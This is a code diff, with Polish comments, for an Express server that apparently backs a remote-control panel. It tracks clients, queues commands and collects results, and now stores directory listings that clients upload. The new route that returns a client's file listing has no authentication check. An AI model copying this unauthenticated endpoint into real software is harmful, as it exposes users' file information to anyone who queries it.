@@ -3,7 +3,6 @@ import cors from 'cors';
 import dotenv from 'dotenv';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import fs from 'fs/promises';
 
 // Setup __dirname i dotenv (tylko lokalnie)
 const __filename = fileURLToPath(import.meta.url);
@@ -24,6 +23,10 @@ if (!API_TOKEN || !PANEL_PASSWORD) {
 const clients = new Set();
 const commands = {};
 const results = {};
+
+// Nowa struktura na listę plików od klienta:
+// { [clientName]: { currentPath: string, files: [{name, type}] } }
+const fileTrees = {};
 
 app.use(cors());
 app.use(express.json());
@@ -106,44 +109,28 @@ app.post('/command', (req, res) => {
   res.sendStatus(200);
 });
 
-// ------------------- Eksplorator plików --------------------
+// ------------------- Eksplorator plików (od klienta) --------------------
 
-// Lista plików i folderów w danym katalogu
-app.get('/api/files', authMiddleware, async (req, res) => {
-  const dirPath = req.query.path;
-  if (!dirPath) return res.status(400).send('Brakuje ścieżki');
+// Klient wysyła listę plików i folderów (dla podanej ścieżki)
+app.post('/files', authMiddleware, (req, res) => {
+  const { client, path, files } = req.body;
+  if (!client || !path || !files) return res.status(400).send('Brakuje danych');
 
-  // Prosta walidacja, możesz rozbudować
-  if (dirPath.includes('..')) return res.status(400).send('Nieprawidłowa ścieżka');
+  // Zapisujemy dane
+  fileTrees[client] = { currentPath: path, files };
 
-  try {
-    const files = await fs.readdir(dirPath, { withFileTypes: true });
-    const list = files.map(file => ({
-      name: file.name,
-      isDirectory: file.isDirectory()
-    }));
-    res.json({ path: dirPath, files: list });
-  } catch (e) {
-    console.error('Błąd czytania katalogu:', e);
-    res.status(500).send('Błąd czytania katalogu');
-  }
+  res.sendStatus(200);
 });
 
-// Pobierz zawartość pliku jako tekst
-app.get('/api/file', authMiddleware, async (req, res) => {
-  const filePath = req.query.path;
-  if (!filePath) return res.status(400).send('Brakuje ścieżki');
+// Panel pobiera listę plików i folderów dla klienta
+app.get('/files', (req, res) => {
+  const client = req.query.client;
+  if (!client) return res.status(400).send('Brakuje klienta');
 
-  // Prosta walidacja, możesz rozbudować
-  if (filePath.includes('..')) return res.status(400).send('Nieprawidłowa ścieżka');
+  const data = fileTrees[client];
+  if (!data) return res.status(404).send('Brak danych o plikach');
 
-  try {
-    const content = await fs.readFile(filePath, 'utf-8');
-    res.json({ path: filePath, content });
-  } catch (e) {
-    console.error('Błąd czytania pliku:', e);
-    res.status(500).send('Błąd czytania pliku');
-  }
+  res.json(data);
 });
 
 app.listen(port, () => {
